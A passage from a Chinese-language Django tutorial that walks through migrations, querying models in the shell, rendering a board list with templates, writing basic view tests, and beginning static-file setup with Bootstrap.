中现有的迁移文件也执行了，这些内置app列在了<code>INSTALLED_APPS</code>。这是预料之中的。</p><p><code>Applying boards.0001_initial... OK</code>是我们在上一步中生成的迁移脚本</p><p>好了！我们的数据库已经可以使用了。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django14.webp" alt=""></p><blockquote><p>需要注意的是SQLite是一个产品级数据库。SQLite被许多公司用于成千上万的产品，如所有Android和iOS设备，主流的Web浏览器，Windows 10，MacOS等。</p></blockquote><blockquote><p>但这不适合所有情况。SQLite不能与MySQL，PostgreSQL或Oracle等数据库进行比较。大容量的网站，密集型写入的应用程序，大的数据集，高并发性的应用使用SQLite最终都会导致问题。</p></blockquote><blockquote><p>我们将在开发项目期间使用SQLite，因为它很方便，不需要安装其他任何东西。当我们将项目部署到生产环境时，再将切换到PostgreSQL（译注：后续，我们后面可能使用MySQL）。对于简单的网站这种做法没什么问题。但对于复杂的网站，建议在开发和生产中使用相同的数据库。</p></blockquote><h3 id="试验Models-API"><a href="#试验Models-API" class="headerlink" title="试验Models API"></a>试验Models API</h3><p>使用Python进行开发的一个重要优点是交互式shell,这是一种快速尝试和试验API的方法</p><p>可以使用<strong>manage.py</strong> 工具加载我们的项目来启动 Python shell ：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">python manage.py shell</code></pre></figure>如图：![](https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django06.jpg)<p>这与直接输入<code>python</code>指令来调用交互式控制台是非常相似的，除此之外，项目将被添加到<code>sys.path</code>并加载Django。这意味着我们可以在项目中导入我们的模型和其他资源并使用它。</p><p>让我们从导入Board类开始：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> boards.models <span class="keyword">import</span> Board</span><br></pre></td></tr></table></figure><p>要创建新的 boarrd 对象，我们可以执行以下操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">board = Board(name=<span class="string">'Django'</span>, description=<span class="string">'This is a board about Django.'</span>)</span><br></pre></td></tr></table></figure><p>为了将这个对象保存在数据库中，我们必须调用save方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">board.save()</span><br></pre></td></tr></table></figure><p><code>save</code>方法用于创建和更新对象。这里Django创建了一个新对象，因为这时<strong>Board</strong> 实例没有id。第一次保存后，Django会自动设置ID：</p><p><code class="highlighter-rouge">board.id<br>1</code></p><p>可以将其余的字段当做Python属性访问：</p><p>如图：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django07.jpg" alt=""></p><p>要更新一个值，我们可以这样做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">board.description = <span class="string">'Django discussion board.'</span></span><br><span class="line">board.save()</span><br></pre></td></tr></table></figure><p>每个Django模型都带有一个特殊的属性; 我们称之为<strong>模型管理器(Model Manager)</strong>。你可以通过属性<code>objects</code>来访问这个管理器，它主要用于数据库操作。例如，我们可以使用它来直接创建一个新的Board对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">board = Board.objects.create(name=<span class="string">'Python'</span>, description=<span class="string">'General discussion about Python.'</span>)</span><br></pre></td></tr></table></figure><p>访问属性：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django08.jpg" alt=""></p><p>所以，现在我们有两个版块了。我们可以使用<code>objects</code>列出数据库中所有现有的版块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Board.objects.all()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Board.objects.all()</span><br><span class="line">&lt;QuerySet [&lt;Board: Board object&gt;, &lt;Board: Board object&gt;]&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>结果是一个<code>QuerySet</code>。稍后我们会进一步了解。基本上，它是从数据库中查询的对象列表。我们看到有两个对象，但显示的名称是 Board object。这是因为我们尚未实现 <strong>Board</strong> 的<code>__str__</code>方法。</p><p><code>__str__</code>方法是对象的字符串表示形式。我们可以使用版块的名称来表示它。</p><p>首先，退出交互式控制台：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit()</span><br></pre></td></tr></table></figure><p>现在编辑boards app 中的 <strong>models.py</strong> 文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Board</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">30</span>, unique=<span class="literal">True</span>)</span><br><span class="line">    description = models.CharField(max_length=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br></pre></td></tr></table></figure><p>重新查询，再次进入交互式控制台：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> boards.models <span class="keyword">import</span> Board</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Board.objects.all()</span><br><span class="line">&lt;QuerySet [&lt;Board: Django&gt;, &lt;Board: Python&gt;]&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>我们可以将这个QuerySet看作一个列表。假设我们想遍历它并打印每个版块的描述：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>boards_list = Board.objects.all()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> board <span class="keyword">in</span> boards_list:</span><br><span class="line"><span class="meta">... </span>    print(board.description)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">Django discussion board.</span><br><span class="line">General discussion about Python.</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>同样，我们可以使用模型的 <strong>管理器（Manager）</strong> 来查询数据库并返回单个对象。为此，我们要使用 <code>get</code>方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>django_board = Board.objects.get(id=<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>django_board.name</span><br><span class="line"><span class="string">'Django'</span></span><br></pre></td></tr></table></figure><p>但我们必须小心这种操作。如果我们试图查找一个不存在的对象，例如，查找id=3的版块，它会引发一个异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>board = Board.objects.get(id=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">boards.models.DoesNotExist: Board matching query does <span class="keyword">not</span> exist.</span><br></pre></td></tr></table></figure><p><code>get</code>方法的参数可以是模型的任何字段，但最好使用可唯一标识对象的字段来查询。否则，查询可能会返回多个对象，这也会导致异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Board.objects.get(name=<span class="string">'Django'</span>)</span><br><span class="line">&lt;Board: Django&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>请注意，查询区分大小写，小写“django”不匹配：</p><table border="1">  <tr>    <th width=10%, bgcolor=#77787b >操作</th>    <th width=40%, bgcolor=#d9d6c3>代码示例</th>  </tr>  <tr>    <td>创建一个对象而不保存</td>    <td>board = Board()</td>  </tr>  <tr>    <td bgcolor=#d9d6c3>保存一个对象（创建或更新）</td>    <td>board.save()</td>  </tr>  <tr>    <td>数据库中创建并保存一个对象</td>    <td>Board.objects.create(name='...',description='...')</td>  </tr>  <tr>    <td bgcolor=#d9d6c3>列出所有对象</td>    <td>Board.objects.all()</td>  </tr>   <tr>    <td>通过字段标识获取单个对象</td>    <td>Board.objects.get(id=1)</td>  </tr></table><h2 id="视图，模板，静态文件"><a href="#视图，模板，静态文件" class="headerlink" title="视图，模板，静态文件"></a>视图，模板，静态文件</h2><p>目前我们已经有一个视图函数叫home,这个视图在我们的应用程序主页上显示为“Hello，World！”</p><p><strong>myproject/urls.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> boards <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^$'</span>, views.home, name=<span class="string">'home'</span>),</span><br><span class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>boards/views.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'Hello, World!'</span>)</span><br></pre></td></tr></table></figure><p>我们可以从这里开始写。如果你回想起我们的原型图，图5显示了主页应该是什么样子。我们想要做的是在表格中列出一些版块的名单以及它们的描述信息。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django10.webp" alt=""></p><p>首先要做的是导入<strong>Board</strong>模型并列出所有的版块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line">    boards = Board.objects.all()</span><br><span class="line">    boards_names = list()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> board <span class="keyword">in</span> boards:</span><br><span class="line">        boards_names.append(board.name)</span><br><span class="line"></span><br><span class="line">    response_html = <span class="string">'&lt;br&gt;'</span>.join(boards_names)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(response_html)</span><br></pre></td></tr></table></figure><p>运行结果就是这个简单的HTML页面：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django09.jpg" alt=""></p><p>真正的项目里面我们不会这样去渲染HTML。对于这个简单视图函数，我们做的就是列出所有版块，然后渲染部分是Django模板引擎的职责。</p><h3 id="Django模板引擎设置"><a href="#Django模板引擎设置" class="headerlink" title="Django模板引擎设置"></a>Django模板引擎设置</h3><p>在<strong>manage.py</strong>所在的目录创建一个名为 <strong>templates</strong>的新文件夹：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">myproject/ |-- myproject/ |    |-- boards/ |    |-- myproject/ |    |-- templates/   &lt;-- 这里 |    +-- manage.py +-- venv/</code></pre></figure><p>在<strong>templates</strong>文件夹中，创建一个名为<strong>home.html</strong>的HTML文件：</p><p><strong>templates/home.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    &#123;% for board in boards %&#125;</span><br><span class="line">      &#123;&#123; board.name &#125;&#125; <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上面的例子中，我们混入了原始HTML和一些特殊标签 <code>{% for ... in ... %} </code>和<code>{{ variable }}</code> 。它们是Django模板语言的一部分。上面的例子展示了如何使用 <code>for</code>遍历列表对象。<code>{{ board.name }}</code>会在 HTML 模板中会被渲染成版块的名称，最后生成动态HTML文档。</p><p>在我们可以使用这个HTML页面之前，我们必须告诉Django在哪里可以找到我们应用程序的模板。</p><p>打开<strong>myproject</strong>目录下面的<strong>settings.py</strong>文件，搜索<code>TEMPLATES</code>变量，并设置<code>DIRS</code> 的值为<code>os.path.join(BASE_DIR, &#39;templates&#39;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">'BACKEND'</span>: <span class="string">'django.template.backends.django.DjangoTemplates'</span>,</span><br><span class="line">        <span class="string">'DIRS'</span>: [</span><br><span class="line">            os.path.join(BASE_DIR, <span class="string">'templates'</span>)</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'APP_DIRS'</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">'OPTIONS'</span>: &#123;</span><br><span class="line">            <span class="string">'context_processors'</span>: [</span><br><span class="line">                <span class="string">'django.template.context_processors.debug'</span>,</span><br><span class="line">                <span class="string">'django.template.context_processors.request'</span>,</span><br><span class="line">                <span class="string">'django.contrib.auth.context_processors.auth'</span>,</span><br><span class="line">                <span class="string">'django.contrib.messages.context_processors.messages'</span>,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>本质上，刚添加的这一行所做的事情就是找到项目的完整路径并在后面附加“/templates”</p><p>我们可以使用Python shell进行调试</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">python manage.py shell</code></pre></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>settings.BASE_DIR</span><br><span class="line"><span class="string">'/home/humen/Development/myproject/myproject'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(settings.BASE_DIR,<span class="string">'templates'</span>)</span><br><span class="line"><span class="string">'/home/humen/Development/myproject/myproject/templates'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>从上面看到，添加部分只是指向我们在前面步骤中创建的<strong>templates</strong>文件夹</p><p>现在我们可以更新<strong>home</strong>视图：</p><p><strong>boards/views.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line">    boards = Board.objects.all()</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'home.html'</span>, &#123;<span class="string">'boards'</span>: boards&#125;)</span><br></pre></td></tr></table></figure><p>生成HTML；</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django10.jpg" alt=""></p><p>我们可以用一个更漂亮的表格来替换，改进HTML模板：</p><p><strong>templates/home.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">th</span>&gt;</span>Board<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">th</span>&gt;</span>Posts<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">th</span>&gt;</span>Topics<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">th</span>&gt;</span>Last Post<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        &#123;% for board in boards %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">              &#123;&#123; board.name &#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">small</span> <span class="attr">style</span>=<span class="string">"color: #888"</span>&gt;</span>&#123;&#123; board.description &#125;&#125;<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django11.jpg" alt=""></p><h3 id="测试主页"><a href="#测试主页" class="headerlink" title="测试主页"></a>测试主页</h3><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django01.webp" alt=""></p><p>测试将是一个反复出现的主题，我将在学习整个教程系列中探讨不同的概念和策略。</p><p>开始写第一个测试。现在，我们将在<strong>boards</strong>应用程序内的<strong>tests.py</strong>文件中操作</p><p><strong>boards/tests.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core.urlresolvers <span class="keyword">import</span> reverse</span><br><span class="line"><span class="keyword">from</span> django.test <span class="keyword">import</span> TestCase</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_home_view_status_code</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = reverse(<span class="string">'home'</span>)</span><br><span class="line">        response = self.client.get(url)</span><br><span class="line">        self.assertEquals(response.status_code, <span class="number">200</span>)</span><br></pre></td></tr></table></figure><p>这是一个非常简单但非常有用的测试用例，我们测试的是请求该URL后返回的响应状态码。状态码200意味着成功。</p><p>请求一下主页后，我们可以在控制台中看到响应的状态代码：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django01.png" alt=""></p><p>如果出现未捕获的异常，语法错误或其他任何情况，Django会返回状态代码<strong>500</strong>，这意味着是<strong>内部服务器错误</strong>。现在，想象我们的应用程序有100个视图函数。如果我们为所有视图编写这个简单的测试，只需一个命令，我们就能够测试所有视图是否返回成功代码，因此用户在任何地方都看不到任何错误消息。如果没有自动化测试，我们需要逐一检查每个页面是否有错误。</p><p>执行Django的测试套件：</p><p><code>python manage.py test</code></p><p>测试结果：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django02.png" alt=""></p><p>现在我们可以测试Django是否在请求的URL的时候返回了正确的视图函数。这也是一个有用的测试，因为随着开发的进展，您会发现<strong>urls.py</strong>模块可能变得非常庞大而复杂。URL conf 全部是关于解析正则表达式的。有些情况下有一个非常宽容的URL（译注：本来不应该匹配的，却因为正则表达式写的过于宽泛而错误的匹配了），所以Django最终可能返回错误的视图函数。</p><p>我们可以这样做：</p><p><strong>boards/tests.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core.urlresolvers <span class="keyword">import</span> reverse</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> resolve</span><br><span class="line"><span class="keyword">from</span> django.test <span class="keyword">import</span> TestCase</span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> home</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeTests</span><span class="params">(TestCase)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_home_view_status_code</span><span class="params">(self)</span>:</span></span><br><span class="line">        url = reverse(<span class="string">'home'</span>)</span><br><span class="line">        response = self.client.get(url)</span><br><span class="line">        self.assertEquals(response.status_code, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_home_url_resolves_home_view</span><span class="params">(self)</span>:</span></span><br><span class="line">        view = resolve(<span class="string">'/'</span>)</span><br><span class="line">        self.assertEquals(view.func, home)</span><br></pre></td></tr></table></figure><p>在第二个测试中，我们使用了<code>resolve</code>函数。Django使用它来将浏览器发起请求的URL与<strong>urls.py</strong>模块中列出的URL进行匹配。该测试用于确定URL <code>/</code>返回 home 视图。</p><p>再次测试：</p><p><code>python manage.py test</code></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django03.png" alt=""></p><p>要查看有关测试执行时更详细的信息，可将<strong>verbosity</strong>的级别设置得更高一点：</p><p><code>python manage.py test --verbosity=2</code></p><p>测试结果：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django04.png" alt=""></p><p><strong>verbosity</strong>决定了将要打印到控制台的通知和调试信息量; 0是无输出，1是正常输出，2是详细输出。</p><h3 id="静态文件设置"><a href="#静态文件设置" class="headerlink" title="静态文件设置"></a>静态文件设置</h3><p>静态文件是指 CSS，JavaScript，字体，图片或者是用来组成用户界面的任何其他资源。</p><p>实际上，Django 本身是不负责处理这些文件的，但是为了让我们的开发过程更轻松，Django 提供了一些功能来帮助我们管理静态文件。这些功能可在 <code>INSTALLED_APPS</code> 的 <strong>django.contrib.staticfiles</strong> 应用程序中找到（译者：Django为了使得开发方便，也可以处理静态文件，而在生产环境下，静态文件一般直接由 Nginx 等反向代理服务器处理，而应用服务器专心负责处理它擅长的业务逻辑）</p><p>市面上很多优秀前端组件框架，我们没有理由继续用简陋的HTML文档来渲染。我们可以轻松地将Bootstrap 4添加到我们的项目中。Bootstrap是一个用HTML，CSS和JavaScript开发的前端开源工具包。</p><p>在项目根目录中，除了<strong>boards, templates 和myproject</strong>文件夹外，再创建一个名为<strong>static</strong>的新文件夹，并在<strong>static</strong>文件夹内创建另一个名为<strong>css</strong>的文件夹：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">myproject/ |-- myproject/ |    |-- boards/ |    |-- myproject/ |    |-- templates/ |    |-- static/       &lt;-- here |    |    +-- css/     &lt;-- and here |    +-- manage.py +-- venv/</code></pre></figure><p>转到<a href="https://github.com/twbs/bootstrap/releases/download/v4.4.1/bootstrap-4.4.1-dist.zip" target="_blank" rel="noopener">getbootstrap.com</a>并下载最新版本：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django02.webp" alt=""></p><p>下载编译版本的CSS和JS</p><p>在你的计算机中，解压 <strong>bootstrap-4.0.0-beta-dist.zip</strong> 文件，将文件 <strong>css/bootstrap.min.css</strong> 复制到我们项目的css文件夹中：</p><figure class="highlight"><pre><code class="language-bash" data-lang="bash">myproject/ |-- myproject/ |    |-- boards/ |    |-- myproject/ |    |-- templates/ |    |-- static/ |    |    +-- css/ |    